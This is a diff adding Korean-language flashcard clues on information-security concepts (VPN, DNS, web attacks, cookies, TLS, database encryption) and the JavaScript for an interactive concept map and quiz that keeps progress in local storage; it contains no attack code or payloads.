+ike:"IPSec에서 쓸 키를 교환하는 프로토콜은?",
+l2f:"시스코가 만든 UDP 기반 2계층 VPN 터널링 프로토콜은?",
+pptp:"마이크로소프트가 만든 PPP 인증 기반 2계층 VPN 프로토콜은?",
+l2tp:"L2F와 PPTP를 합친 2계층 VPN 프로토콜은?",
+wep:"RC4를 쓰고 24비트 IV가 짧아 쉽게 뚫리는 무선 암호화 방식은?",
+wpa2:"AES-CCMP를 쓰는 무선 보안 방식은?",
+e2ee:"보내는 기기에서 암호화하고 받는 기기에서만 복호화해 서버에서도 못 보는 암호화는?",
+active:"FTP에서 서버가 20번 포트로 클라이언트에 먼저 데이터 연결을 거는 모드는?",
+passive:"FTP에서 서버가 1024 이상 임의 포트를 열고 클라이언트가 먼저 연결하는 모드는?",
+tftp:"UDP 69번을 쓰고 인증 등 보안 기능이 없는 파일 전송 프로토콜은?",
+anonftp:"서버에 자신을 식별시키지 않고 파일에 접근하는 방식을 이용한 FTP 공격(방식)은?",
+bounce:"PORT 명령에 제3자 IP·포트를 적어 FTP 서버가 대신 스캔·공격하게 하는 공격은?",
+tcpwrap:"inetd 앞에서 IP로 서비스 접근을 통제하는 도구와, 먼저 보는 허용 파일 → 거부 파일 이름은?",
+pgp:"1991년 필 짐머만이 개발, OpenPGP(RFC 4880), 메일에 기밀성·무결성·인증을 제공하는 프로그램은?",
+smime:"인증기관(CA)이 발급한 인증서 기반 메일 보안 표준은?",
+spfdkim:"DNS TXT 레코드로 메일 발신 서버·서명을 검증해 발신자 위조를 막는 기술 2개와 둘을 합친 정책은?",
+xss:"악성 스크립트가 다른 사용자(피해자) 브라우저에서 실행되어 정보를 추출하는 공격은?",
+csrf:"로그인한 피해자의 브라우저가 의도하지 않은 위조 요청을 쿠키와 함께 서버로 보내게 하는 공격은?",
+ssrf:"서버 간 요청에 검증 안 된 입력값을 허용해 서버가 공격자가 고른(내부망) 곳으로 요청을 보내게 하는 약점은?",
+sqlidef:"SQL 삽입 대응 3가지: DB를 (  ) 권한으로 구동 / (  ) 쿼리 생성 금지 / 클라이언트 (  ) 특수문자 검사",
+oscmd:"OS 명령어를 만들 때 검증 안 된 입력(; | &&)으로 악의적인 명령을 실행하는 보안 약점은?",
+fileinc:"파일 삽입 취약점 대응: 코드에서 점검할 구문 2개 / 설정 파일 / allow_url_fopen 값은?",
+fupload:"서버 측에 스크립트 파일을 올리고 실행시켜 웹 서버를 제어하는 공격은?",
+webshell:"서버 언어(PHP·ASP·JSP)로 만든 스크립트 파일로, 업로드 후 시스템 명령을 실행하는 것은?",
+webproxy:"Burp Suite, Paros, OWASP ZAP처럼 요청을 중간에서 붙잡아 고치는 도구를 부르는 말은?",
+proxy:"클라이언트 대신 인터넷상의 다른 서버에 접속해 주는 서버는?",
+robots:"사이트 루트에 두고 크롤러에게 수집하지 말 경로를 지시하는 파일은? (철자 주의)",
+deeplink:"모바일 앱의 특정 콘텐츠·기능으로 바로 연결해 주는 링크로, 악용 시 개인정보가 노출되는 것은?",
+apachelog:"아파치의 정상 접속 로그 / 에러 로그 이름과, 로그 경로를 지정하는 설정 파일은?",
+zone:"도메인의 DNS 레코드를 저장하는 데이터베이스 파일과, 이름–값이 매핑된 레코드 한 줄을 부르는 말은?",
+dnscache:"DNS 조회 결과를 (  )에 (  )만큼 저장해 두고 같은 질의에 빨리 답하는 기능의 두 빈칸은?",
+cachens:"호스트의 DNS 조회 결과를 일시적으로 저장하고, 없으면 대신 찾아다니는 DNS 서버는?",
+authns:"특정 도메인의 DNS 정보(존 파일)를 직접 관리하는 네임 서버는? (영어 철자까지)",
+dnsspoof:"해커의 가짜 DNS 응답이 정상 응답보다 먼저 도착해 사용자를 악성 사이트로 보내는 공격은?",
+subtake:"클라우드 서비스를 해지하고 CNAME을 안 지워 공격자가 같은 이름으로 재등록해 악용하는 공격은?",
+hostsfile:"모든 OS에 있고 도메인의 IP를 수동 지정하며 DNS보다 먼저 확인하는 파일은?",
+accctl:"사용자가 DB 자원에 접근할 수 있는 권한을 관리하는 통제 기법은?",
+infctl:"간접 노출된 데이터로 다른 데이터를 추론해 공개되는 것을 막는 통제 기법은?",
+flowctl:"객체 간 정보 흐름을 조정해 기밀 정보가 낮은 보호 수준으로 이동하는 것을 검사하는 통제 기법은?",
+encapi:"암·복호화 모듈을 라이브러리로 애플리케이션 서버에 설치하고 응용 프로그램이 호출하는 DB 암호화 방식은?",
+encplug:"암·복호화 모듈을 DB 서버에 설치하고 DBMS가 연결해 호출하는 DB 암호화 방식은?",
+enctde:"DBMS에 내장된 암호화 기능으로 암·복호화하는 방식은?",
+aggr:"낮은 보안등급의 정보 조각을 조합해 높은 등급 정보를 알아내는 공격은?",
+infer:"보안으로 분류되지 않은 정보에 접근한 뒤 기밀정보를 유추하는 공격은?",
+diddle:"처리할 자료를 다른 자료와 바꿔서 처리하는 공격은?",
+cve:"MITRE가 운영하는 취약점 고유번호 체계와, 그 형식 ○○○-YYYY-NNNN에서 YYYY·NNNN의 의미는?",
+cvss:"CVE의 요소로 취약성 심각도를 0~10점으로 평가하며 기본·시간·환경 메트릭을 쓰는 표준은?",
+heartbleed:"CVE-2014-0160, OpenSSL Heartbeat에서 길이 미검증으로 64KB씩 메모리를 빼내는 취약점은?",
+log4j:"아파치 로깅 서비스의 자바 로깅 유틸리티로, JNDI·LDAP을 이용해 원격 코드를 실행당한 프로그램은?",
+poodle:"TLS를 SSL 3.0으로 다운그레이드시킨 뒤 CBC 패딩 오라클로 암호문을 푸는 공격은?",
+secure:"쿠키가 HTTPS 연결에서만 전송되게 하는 속성과 막는 공격은?",
+httponly:"자바스크립트(document.cookie)로 쿠키에 접근하지 못하게 하는 속성과 막는 공격은?",
+expires:"쿠키의 만료 시간을 정하는 속성은?",
+samesite:"다른 사이트에서 시작된 요청에 쿠키를 붙일지 정해 CSRF를 막는 속성은?",
+xsssteal:"게시판에 쿠키 탈취 가능 여부를 점검할 때 넣는 스크립트 한 줄은?",
+xst:"TRACE 메서드가 요청을 그대로 돌려주는 점을 이용해 HttpOnly 쿠키를 읽는 공격은?",
+cktamper:"쿠키에 role=user 같은 권한 값을 담았을 때 사용자가 바꿔 권한을 올리는 공격과 대응은?",
+ips:"침입을 탐지만 하는 IDS와 달리, 탐지하고 차단까지 하는 장비는?",
+te_te:"Request Smuggling에서 둘 다 chunked를 지원하지만, 헤더를 변형해 한쪽이 chunked를 무시하게 만드는 유형은?",
+vip:"네트워크 주소(IP)별로 VLAN을 구성하는 방식은?",
+vproto:"같은 통신 프로토콜끼리 통신하도록 VLAN을 구성하는 방식은?",
+snmpcomp:"SNMP에서 장비를 감시하는 관리 서버 / 장비 안에서 정보를 주는 프로그램 / 장비 정보 데이터베이스 세 가지 이름은?",
+rootns:"DNS 계층 맨 꼭대기에서 .com·.kr 같은 최상위 도메인 서버의 위치를 알려 주는 네임 서버는?",
+tldns:".com, .org, .net, .kr 같은 최상위 도메인을 관리하는 네임 서버는?",
+encos:"운영체제의 파일 입출력 단계에서 디스크·파일 단위로 암호화하는 DB 암호화 방식은?",
+cksvs:"브라우저에 저장돼 사용자가 바꿀 수 있는 것(①)과 서버에 저장되는 것(②)은? 그리고 ②의 ID는 어떻게 만들어야 하나(21회)?",
+wpa:"WEP의 약점을 보완해 TKIP를 쓰는 무선 보안 방식은?",
+wpa3:"AES-GCMP와 SAE를 쓰는 최신 무선 보안 방식은?",
+hs:"TLS에서 서로 인증하고 암호 알고리즘과 키를 협상하는 상위 프로토콜은?",
+ccs:"TLS에서 협상한 암호 방식으로 이제부터 바꾼다고 알리는 상위 프로토콜은?",
+alert:"TLS에서 문제가 생기면 경고·오류를 알리는 상위 프로토콜은?"
+};
+var QKEY='concept-quiz-state',qs={};
+try{qs=JSON.parse(localStorage.getItem(QKEY)||'{}')||{};}catch(e){qs={};}
+function saveQ(){try{localStorage.setItem(QKEY,JSON.stringify(qs));}catch(e){}}
+function isMiss(t){return qs[t.id]==='miss'||(t.m&&qs[t.id]!=='ok');}
+var NS='http://www.w3.org/2000/svg';
+var svg=document.getElementById('map'),box=document.getElementById('mapbox');
+var byId={},rel={},open={},view={},edges=[],bounds,zoom=1,selId=null;
+(function walk(t,p,depth,side){
+  t.parent=p;t.depth=depth;t.side=side;byId[t.id]=t;
+  t.k.forEach(function(c){walk(c,t,depth+1,depth===0?(LEFT.indexOf(c.id)>=0?-1:1):side);});
+})(TREE,null,0,0);
+LINKS.forEach(function(l){(rel[l[0]]=rel[l[0]]||[]).push(l[1]);(rel[l[1]]=rel[l[1]]||[]).push(l[0]);});
+
+var OKEY='concept-map-open3';
+function defaultOpen(){open={center:1};TREE.k.forEach(function(h){open[h.id]=1;});}
+try{var saved=JSON.parse(localStorage.getItem(OKEY)||'null');if(saved&&saved.center)open=saved;else defaultOpen();}catch(e){defaultOpen();}
+function saveOpen(){try{localStorage.setItem(OKEY,JSON.stringify(open));}catch(e){}}
+
+var cv=document.createElement('canvas').getContext('2d');
+var BODY='"Noto Sans KR",system-ui,sans-serif',DISP='"IBM Plex Sans KR","Noto Sans KR",system-ui,sans-serif';
+function tw(t,size,weight,fam){cv.font=weight+' '+size+'px '+fam;return cv.measureText(t).width;}
+function el(nm,a,p){var e=document.createElementNS(NS,nm);for(var k in a)e.setAttribute(k,a[k]);if(p)p.appendChild(e);return e;}
+function style(t){
+  if(t.depth===0)return {fs:17,fw:700,fam:DISP,h:46,kind:'center'};
+  if(t.depth===1)return {fs:15,fw:700,fam:DISP,h:36,kind:'hub'};
+  if(t.k.length)return {fs:14,fw:700,fam:BODY,h:30,kind:'group'};
+  return {fs:13.5,fw:500,fam:BODY,h:28,kind:'leaf'};
+}
+function badge(t){return t.k.length&&t.depth>0?(open[t.id]?'  −':'  +'+t.k.length):'';}
+function isVisible(t){for(var p=t.parent;p;p=p.parent)if(!open[p.id])return false;return true;}
+
+function layout(){
+  svg.innerHTML='';view={};edges=[];
+  var gE=el('g',{},svg);el('g',{id:'xl'},svg);var gN=el('g',{},svg);
+  var ROW=36,HUBGAP=26,SUBGAP=6,GAPX=46;
+  var c=style(TREE);
+  view.center={t:TREE,x:0,y:0,w:tw(TREE.label,c.fs,c.fw,c.fam)+44,h:c.h,s:c};
+  var minX=-view.center.w/2,maxX=view.center.w/2,minY=-40,maxY=40;
+  [-1,1].forEach(function(side){
+    var hubs=TREE.k.filter(function(h){return h.side===side;});
+    var maxW={};
+    function measure(t){
+      var s=style(t),w=tw(t.label,s.fs,s.fw,s.fam)+(badge(t)?tw(badge(t),12,500,BODY):0)+28;
+      view[t.id]={t:t,w:w,h:s.h,s:s};
+      maxW[t.depth]=Math.max(maxW[t.depth]||0,w);
+      if(open[t.id])t.k.forEach(measure);
+    }
+    hubs.forEach(measure);
+    var col={1:view.center.w/2+64};
+    for(var d=2;maxW[d];d++)col[d]=col[d-1]+maxW[d-1]+GAPX;
+    var cur=0;
+    function place(t){
+      var v=view[t.id],kids=open[t.id]?t.k:[];
+      if(kids.length){
+        kids.forEach(place);
+        v.y=(view[kids[0].id].y+view[kids[kids.length-1].id].y)/2;
+        if(t.depth>=2)cur+=SUBGAP;
+      }else{v.y=cur+ROW/2;cur+=ROW;}
+      v.x=side*(col[t.depth]+v.w/2);
+    }
+    hubs.forEach(function(h,i){if(i)cur+=HUBGAP;place(h);});
+    var off=-cur/2;
+    Object.keys(view).forEach(function(id){var v=view[id];if(v.t.side===side&&v.t.depth>0){v.y+=off;
+      minX=Math.min(minX,v.x-v.w/2);maxX=Math.max(maxX,v.x+v.w/2);}});
+    minY=Math.min(minY,off);maxY=Math.max(maxY,-off);
+  });
+  var pad=36;bounds={x:minX-pad,y:minY-pad,w:maxX-minX+pad*2,h:maxY-minY+pad*2};
+  svg.setAttribute('viewBox',[bounds.x,bounds.y,bounds.w,bounds.h].join(' '));
+
+  function curve(x1,y1,x2,y2){var k=(x2-x1)*.5;return 'M'+x1+' '+y1+' C'+(x1+k)+' '+y1+' '+(x2-k)+' '+y2+' '+x2+' '+y2;}
+  Object.keys(view).forEach(function(id){
+    var v=view[id],t=v.t;if(!t.parent)return;
+    var p=view[t.parent.id],s=t.side;
+    var px=t.parent.depth===0?s*p.w/2:p.x+s*p.w/2;
+    var e=el('path',{class:'edge',d:curve(px,p.y,v.x-s*v.w/2,v.y)},gE);
+    edges.push({el:e,a:t.parent.id,b:id});
+  });
+  Object.keys(view).forEach(function(id){
+    var v=view[id],t=v.t,s=v.s;
+    var g=el('g',{class:'node '+s.kind+(isMiss(t)?' miss':''),tabindex:'0',role:'button','aria-label':t.label+(t.k.length&&t.depth>0?(open[id]?', 펼쳐짐':', 접힘'):''),'data-id':id},gN);
+    el('rect',{x:v.x-v.w/2,y:v.y-v.h/2,width:v.w,height:v.h,rx:v.h/2},g);
+    var tx=el('text',{x:v.x,y:v.y+1,'text-anchor':'middle','dominant-baseline':'middle','font-size':s.fs,'font-weight':s.fw},g);
+    tx.appendChild(document.createTextNode(t.label));
+    var b=badge(t);
+    if(b){var ts=el('tspan',{class:'badge','font-size':12},tx);ts.textContent=b;}
+    v.g=g;
+    g.addEventListener('click',function(ev){ev.stopPropagation();activate(id);});
+    g.addEventListener('keydown',function(ev){if(ev.key==='Enter'||ev.key===' '){ev.preventDefault();activate(id);}});
+  });
+  applyZoom();
+}
+svg.addEventListener('click',function(){clear();});
+
+function applyZoom(){svg.setAttribute('width',Math.round(bounds.w*zoom));svg.setAttribute('height',Math.round(bounds.h*zoom));}
+function fitZoom(){return Math.min(1.1,(box.clientWidth-4)/bounds.w);}
+function centerView(){box.scrollLeft=((0-bounds.x)*zoom)-box.clientWidth/2;box.scrollTop=((0-bounds.y)*zoom)-box.clientHeight/2;}
+function setZoom(z,keep){
+  var cx=(box.scrollLeft+box.clientWidth/2)/zoom,cy=(box.scrollTop+box.clientHeight/2)/zoom;
+  zoom=Math.max(.35,Math.min(1.8,z));applyZoom();
+  if(keep){box.scrollLeft=cx*zoom-box.clientWidth/2;box.scrollTop=cy*zoom-box.clientHeight/2;}else centerView();
+}
+function screenPos(id){var v=view[id];return {x:(v.x-bounds.x)*zoom-box.scrollLeft,y:(v.y-bounds.y)*zoom-box.scrollTop};}
+function relayoutKeeping(id){
+  var before=view[id]?screenPos(id):null;
+  layout();
+  if(before&&view[id]){var v=view[id];box.scrollLeft=(v.x-bounds.x)*zoom-before.x;box.scrollTop=(v.y-bounds.y)*zoom-before.y;}
+}
+
+var panel=document.getElementById('panel');
+function clear(){
+  selId=null;svg.classList.remove('focus');
+  svg.querySelectorAll('.on,.sel,.rel').forEach(function(e){e.classList.remove('on','sel','rel');});
+  var xl=document.getElementById('xl');if(xl)xl.innerHTML='';
+  panel.hidden=true;
+}
+function xlink(a,b){
+  var A=view[a],B=view[b],gx=document.getElementById('xl'),d;
+  if(A.t.side===B.t.side){
+    var s=A.t.side,ax=A.x+s*A.w/2,bx=B.x+s*B.w/2,ox=s*Math.max(Math.abs(ax),Math.abs(bx))+s*60;
+    d='M'+ax+' '+A.y+' C'+ox+' '+A.y+' '+ox+' '+B.y+' '+bx+' '+B.y;
+  }else{
+    var ax2=A.x-A.t.side*A.w/2,bx2=B.x-B.t.side*B.w/2;
+    d='M'+ax2+' '+A.y+' C'+(ax2-A.t.side*160)+' '+A.y+' '+(bx2-B.t.side*160)+' '+B.y+' '+bx2+' '+B.y;
+  }
+  el('path',{class:'xlink',d:d},gx);
+}
+function markPath(id){for(var t=byId[id];t;t=t.parent)if(view[t.id])view[t.id].g.classList.add('on');}
+function highlight(id){
+  svg.classList.add('focus');
+  var t=byId[id];markPath(id);view[id].g.classList.add('sel');
+  if(open[id])t.k.forEach(function(c){view[c.id].g.classList.add('on');});
+  (rel[id]||[]).forEach(function(r){if(view[r]){markPath(r);view[r].g.classList.add('rel');xlink(id,r);}});
+  edges.forEach(function(e){if(view[e.a].g.classList.contains('on')&&view[e.b].g.classList.contains('on'))e.el.classList.add('on');});
+}
+function showPanel(id){
+  var t=byId[id],path=[];
+  for(var p=t.parent;p&&p.depth>0;p=p.parent)path.unshift(p.label);
+  document.getElementById('p-where').textContent=path.length?path.join(' › '):'갈래';
+  document.getElementById('p-title').textContent=t.label;
+  var desc=document.getElementById('p-desc');desc.innerHTML='';
+  t.d.forEach(function(s){var li=document.createElement('li');li.textContent=s;desc.appendChild(li);});
+  var rb=document.getElementById('p-rel');rb.innerHTML='';
+  (rel[id]||[]).forEach(function(r){
+    var b=document.createElement('button');b.type='button';b.textContent=byId[r].label;
+    b.addEventListener('click',function(){goTo(r);});rb.appendChild(b);
+  });
+  document.getElementById('p-relwrap').hidden=!(rel[id]||[]).length;
+  panel.hidden=false;panel.scrollTop=0;
+}
+function activate(id){
+  if(id==='center'){clear();return;}
+  var t=byId[id];
+  if(t.k.length){
+    if(open[id]){(function shut(n){delete open[n.id];n.k.forEach(shut);})(t);}else open[id]=1;
+    saveOpen();relayoutKeeping(id);
+  }else clear();
+  clear();selId=id;highlight(id);showPanel(id);
+}
+function goTo(id){
+  for(var p=byId[id].parent;p;p=p.parent)open[p.id]=1;
+  saveOpen();layout();clear();selId=id;highlight(id);showPanel(id);
+  var v=view[id];
+  box.scrollTo({left:(v.x-bounds.x)*zoom-box.clientWidth/2,top:(v.y-bounds.y)*zoom-box.clientHeight/2,behavior:matchMedia('(prefers-reduced-motion: reduce)').matches?'auto':'smooth'});
+}
+document.getElementById('p-close').addEventListener('click',clear);
+document.addEventListener('keydown',function(e){if(e.key==='Escape')clear();});
+
+document.getElementById('open-all').addEventListener('click',function(){
+  Object.keys(byId).forEach(function(id){if(byId[id].k.length)open[id]=1;});saveOpen();clear();layout();setZoom(fitZoom(),false);
+});
+document.getElementById('close-all').addEventListener('click',function(){
+  defaultOpen();saveOpen();clear();layout();setZoom(Math.max(.62,fitZoom()),false);
+});
+var mb=document.getElementById('toggle-miss'),KEY='concept-map-miss';
+function setMiss(on){document.body.classList.toggle('show-miss',on);mb.setAttribute('aria-pressed',on?'true':'false');}
+try{if(localStorage.getItem(KEY)==='1')setMiss(true);}catch(e){}
+mb.addEventListener('click',function(){var on=mb.getAttribute('aria-pressed')!=='true';setMiss(on);try{localStorage.setItem(KEY,on?'1':'0');}catch(e){}});
+document.getElementById('zoom-in').addEventListener('click',function(){setZoom(zoom*1.2,true);});
+document.getElementById('zoom-out').addEventListener('click',function(){setZoom(zoom/1.2,true);});
+document.getElementById('zoom-fit').addEventListener('click',function(){setZoom(fitZoom(),false);});
+
+function init(){layout();zoom=Math.max(.62,fitZoom());applyZoom();centerView();}
+var done=false,ready=false;function once(){if(!done&&ready&&!document.getElementById('view-map').hidden){done=true;init();}}
+function fontsOk(){ready=true;once();}
+if(document.fonts&&document.fonts.ready){document.fonts.ready.then(fontsOk);setTimeout(fontsOk,1200);}else fontsOk();
+
+/* ── 탭 ── */
+var TKEY='concept-tab';
+function showTab(name){
+  var q=name!=='map';
+  document.getElementById('view-quiz').hidden=!q;document.getElementById('view-map').hidden=q;
+  document.getElementById('tab-quiz').setAttribute('aria-selected',q?'true':'false');
+  document.getElementById('tab-map').setAttribute('aria-selected',q?'false':'true');
+  if(q)clear();else if(done)layout();else once();
+  try{localStorage.setItem(TKEY,name);}catch(e){}
+}
+document.getElementById('tab-quiz').addEventListener('click',function(){showTab('quiz');renderQuiz();});
+document.getElementById('tab-map').addEventListener('click',function(){showTab('map');});
+
+/* ── 가리기 ── */
+var chapters=[];
+TREE.k.forEach(function(s){s.k.forEach(function(c){
+  var items=[];(function w(t){if(CLUES[t.id])items.push(t);t.k.forEach(w);})(c);
+  if(items.length)chapters.push({id:c.id,label:s.label.replace(/ .*/,'')+' '+c.label,items:items});
+});});
+var sel=document.getElementById('q-ch'),missOnly=false,order=null,shown={};
+var opt=document.createElement('option');opt.value='all';opt.textContent='전체 장';sel.appendChild(opt);
+chapters.forEach(function(c){var o=document.createElement('option');o.value=c.id;o.textContent=c.label+' ('+c.items.length+')';sel.appendChild(o);});
+try{var sc=localStorage.getItem('concept-quiz-ch');if(sc&&sel.querySelector('option[value="'+sc+'"]'))sel.value=sc;}catch(e){}
+function pool(){var out=[];chapters.forEach(function(c){if(sel.value==='all'||sel.value===c.id)out=out.concat(c.items);});return out;}
+function pathOf(t){var p=[];for(var x=t.parent;x&&x.depth>1;x=x.parent)p.unshift(x.label);return p.join(' › ');}
+function renderQuiz(){
+  var box=document.getElementById('q-cards');box.innerHTML='';
+  var items=pool();if(order)items=order.filter(function(t){return items.indexOf(t)>=0;});
+  var all=items.length,missN=items.filter(isMiss).length,okN=items.filter(function(t){return qs[t.id]==='ok';}).length;
+  if(missOnly)items=items.filter(isMiss);
+  document.getElementById('q-stat').textContent=all+'개 · 알았음 '+okN+' · 헷갈림 '+missN;
+  if(!items.length){var e=document.createElement('div');e.className='empty';e.textContent=missOnly?'헷갈린 개념이 없어요.':'이 장에는 아직 카드가 없어요.';box.appendChild(e);return;}
+  items.forEach(function(t){
+    var c=document.createElement('article');c.className='card'+(isMiss(t)?' miss':'');
+    var p=document.createElement('div');p.className='path';p.textContent=pathOf(t);c.appendChild(p);
+    var q=document.createElement('div');q.className='clue';q.textContent=CLUES[t.id];c.appendChild(q);
+    var ans=document.createElement('div');ans.className='ans';ans.hidden=!shown[t.id];
+    var b=document.createElement('b');b.textContent=t.label;ans.appendChild(b);
+    var ul=document.createElement('ul');t.d.forEach(function(s){var li=document.createElement('li');li.textContent=s;ul.appendChild(li);});ans.appendChild(ul);
+    var act=document.createElement('div');act.className='act';
+    var r=document.createElement('button');r.type='button';r.className='reveal';r.textContent=shown[t.id]?'답 가리기':'답 보기';
+    r.addEventListener('click',function(){shown[t.id]=!shown[t.id];ans.hidden=!shown[t.id];r.textContent=shown[t.id]?'답 가리기':'답 보기';});
+    var ok=document.createElement('button');ok.type='button';ok.textContent='알았음';if(qs[t.id]==='ok')ok.className='on';
+    var no=document.createElement('button');no.type='button';no.textContent='몰랐음';if(qs[t.id]==='miss')no.className='on';
+    ok.addEventListener('click',function(){qs[t.id]=qs[t.id]==='ok'?undefined:'ok';saveQ();renderQuiz();});
+    no.addEventListener('click',function(){qs[t.id]=qs[t.id]==='miss'?undefined:'miss';saveQ();renderQuiz();});
+    act.appendChild(r);act.appendChild(ok);act.appendChild(no);
+    c.appendChild(act);c.appendChild(ans);box.appendChild(c);
+  });
+}
+sel.addEventListener('change',function(){order=null;try{localStorage.setItem('concept-quiz-ch',sel.value);}catch(e){}renderQuiz();});
+var mo=document.getElementById('q-missonly');
+mo.addEventListener('click',function(){missOnly=!missOnly;mo.setAttribute('aria-pressed',missOnly?'true':'false');renderQuiz();});
+document.getElementById('q-shuffle').addEventListener('click',function(){var a=pool().slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var x=a[i];a[i]=a[j];a[j]=x;}order=a;shown={};renderQuiz();});
+document.getElementById('q-hideall').addEventListener('click',function(){shown={};renderQuiz();});
+var startTab='quiz';try{startTab=localStorage.getItem(TKEY)||'quiz';}catch(e){}
+showTab(startTab);renderQuiz();
+})();
+</script>
+
+</body></html>
